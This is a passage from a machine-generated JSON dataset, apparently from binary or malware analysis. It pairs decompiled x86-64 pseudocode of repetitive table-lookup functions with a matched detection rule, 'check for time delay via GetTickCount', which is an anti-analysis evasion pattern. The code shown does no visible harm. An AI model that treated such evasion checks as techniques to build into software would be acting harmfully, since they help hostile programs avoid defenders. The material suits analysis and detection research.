uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3084
    },
    "1400b9a3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9a30(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2630
    },
    "1400b9a9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9a90(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108950);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2477
    },
    "1400b9af": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9af0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2324
    },
    "1400b9b5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9b50(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 